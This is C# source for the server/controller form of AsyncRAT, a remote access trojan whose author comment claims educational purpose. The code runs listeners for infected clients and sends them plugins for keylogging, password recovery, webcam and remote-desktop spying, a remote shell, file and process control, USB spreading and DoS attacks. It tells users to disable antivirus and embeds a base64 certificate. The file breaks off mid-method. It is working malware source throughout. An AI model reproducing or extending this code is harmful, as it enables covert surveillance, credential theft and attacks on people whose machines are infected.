using System;
using System.Windows.Forms;
using Server.MessagePack;
using Server.Connection;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;
using Server.Forms;
using Server.Algorithm;
using System.Diagnostics;
using Server.Handle_Packet;
using Server.Helper;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using cGeoIp;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program Is distributed for educational purposes only.
*/

namespace Server
{

    public partial class Form1 : Form
    {
        private bool trans;
        public cGeoMain cGeoMain = new cGeoMain();
        private List<AsyncTask> getTasks = new List<AsyncTask>();
        private ListViewColumnSorter lvwColumnSorter;

        public Form1()
        {
            InitializeComponent();
            SetWindowTheme(listView1.Handle, "explorer", null);
            this.Opacity = 0;
            formDOS = new FormDOS
            {
                Name = "DOS",
                Text = "DOS",
            };
            listView1.SmallImageList = cGeoMain.cImageList;
            listView1.LargeImageList = cGeoMain.cImageList;
        }

        #region Form Helper
        private void CheckFiles()
        {
            try
            {
                if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                {
                    MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
                    MessageBox.Show("Stub not found! unzip files again and make sure your AV is OFF");

                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private Clients[] GetSelectedClients()
        {
            List<Clients> clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.SelectedItems.Count == 0) return;
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        clientsList.Add((Clients)itm.Tag);
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private Clients[] GetAllClients()
        {
            List<Clients> clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.Items.Count == 0) return;
                    foreach (ListViewItem itm in listView1.Items)
                    {
                        clientsList.Add((Clients)itm.Tag);
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private async void Connect()
        {
            try
            {
                await Task.Delay(1000);
                string[] ports = Properties.Settings.Default.Ports.Split(',');
                foreach (var port in ports)
                {
                    if (!string.IsNullOrWhiteSpace(port))
                    {
                        Listener listener = new Listener();
                        Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                        thread.IsBackground = true;
                        thread.Start(Convert.ToInt32(port.ToString().Trim()));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        #endregion

        #region Form Events
        private async void Form1_Load(object sender, EventArgs e)
        {

            ListviewDoubleBuffer.Enable(listView1);
            ListviewDoubleBuffer.Enable(listView2);
            ListviewDoubleBuffer.Enable(listView3);

            try
            {
                foreach (string client in Properties.Settings.Default.txtBlocked.Split(','))
                {
                    if (!string.IsNullOrWhiteSpace(client))
                    {
                        Settings.Blocked.Add(client);
                    }
                }
            }
            catch { }

            CheckFiles();
            lvwColumnSorter = new ListViewColumnSorter();
            this.listView1.ListViewItemSorter = lvwColumnSorter;
            this.Text = $"{Settings.Version}";
#if DEBUG
            Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String("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"));
            Listener listener = new Listener();
            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
            thread.IsBackground = true;
            thread.Start(6606);
#else
            using (FormPorts portsFrm = new FormPorts())
            {
                portsFrm.ShowDialog();
            }
#endif


            await Methods.FadeIn(this, 5);
            trans = true;

            if (Properties.Settings.Default.Notification == true)
            {
                toolStripStatusLabel2.ForeColor = Color.Green;
            }
            else
            {
                toolStripStatusLabel2.ForeColor = Color.Black;
            }

            new Thread(() =>
            {
                Connect();
            }).Start();
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            if (trans)
                this.Opacity = 1.0;
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Opacity = 0.95;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }

        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }

        private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                {
                    lvwColumnSorter.Order = SortOrder.Descending;
                }
                else
                {
                    lvwColumnSorter.Order = SortOrder.Ascending;
                }
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            this.listView1.Sort();
        }

        private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.Notification == true)
            {
                Properties.Settings.Default.Notification = false;
                toolStripStatusLabel2.ForeColor = Color.Black;
            }
            else
            {
                Properties.Settings.Default.Notification = true;
                toolStripStatusLabel2.ForeColor = Color.Green;
            }
            Properties.Settings.Default.Save();
        }

        #endregion

        #region MainTimers
        private void ping_Tick(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients client in GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                GC.Collect();
            }
        }

        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
            lock (Settings.LockListviewClients)
                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
        }

        #endregion

        #region Client


        #region Send File
        private void TOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                FormSendFileToMemory formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.IsOK)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendMemory";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));
                    if (formSend.comboBox1.SelectedIndex == 0)
                    {
                        packet.ForcePathObject("Inject").AsString = "";
                    }
                    else
                    {
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                    }

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendMemory.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private async void TODISKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));

                        foreach (Clients client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (string file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
        #endregion

        #region Monitoring

        private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                //DLL Plugin
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteDesktop.dll"));
                foreach (Clients client in GetSelectedClients())
                {
                    FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
                    if (remoteDesktop == null)
                    {
                        remoteDesktop = new FormRemoteDesktop
                        {
                            Name = "RemoteDesktop:" + client.ID,
                            F = this,
                            Text = "RemoteDesktop:" + client.ID,
                            ParentClient = client,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
                        };
                        remoteDesktop.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\LimeLogger.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                    if (KL == null)
                    {
                        KL = new FormKeylogger
                        {
                            Name = "keyLogger:" + client.ID,
                            Text = "keyLogger:" + client.ID,
                            F = this,
                        };
                        KL.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\FileManager.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormFileManager fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                    if (fileManager == null)
                    {
                        fileManager = new FormFileManager
                        {
                            Name = "fileManager:" + client.ID,
                            Text = "fileManager:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
                        };
                        fileManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void PasswordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Recovery.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
                tabControl1.SelectedIndex = 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\ProcessManager.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormProcessManager processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                    if (processManager == null)
                    {
                        processManager = new FormProcessManager
                        {
                            Name = "processManager:" + client.ID,
                            Text = "processManager:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        processManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string title = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam");
                if (string.IsNullOrEmpty(title))
                    return;
                else
                {
                    lock (Settings.LockReportWindowClients)
                    {
                        Settings.ReportWindowClients.Clear();
                        Settings.ReportWindowClients = new List<Clients>();
                    }
                    Settings.ReportWindow = true;

                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "reportWindow";
                    packet.ForcePathObject("Option").AsString = "run";
                    packet.ForcePathObject("Title").AsString = title;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                Settings.ReportWindow = false;
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "reportWindow";
                packet.ForcePathObject("Option").AsString = "stop";
                lock (Settings.LockReportWindowClients)
                    foreach (Clients clients in Settings.ReportWindowClients)
                    {
                        ThreadPool.QueueUserWorkItem(clients.Send, packet.Encode2Bytes());
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteCamera.dll"));

                    foreach (Clients client in GetSelectedClients())
                    {
                        FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
                        if (remoteDesktop == null)
                        {
                            remoteDesktop = new FormWebcam
                            {
                                Name = "Webcam:" + client.ID,
                                F = this,
                                Text = "Webcam:" + client.ID,
                                ParentClient = client,
                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
                            };
                            remoteDesktop.Show();
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }

        }


        #endregion

        #region Miscellaneous

        private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "botKiller";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
                tabControl1.SelectedIndex = 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void USBSpreadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "limeUSB";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
            { }
        }

        private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            using (FormTorrent formTorrent = new FormTorrent())
            {
                formTorrent.ShowDialog();
            }
        }

        private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "shell";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
                    if (shell == null)
                    {
                        shell = new FormShell
                        {
                            Name = "shell:" + client.ID,
                            Text = "shell:" + client.ID,
                            F = this,
                        };
                        shell.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private readonly FormDOS formDOS;
        private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "dosAdd";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
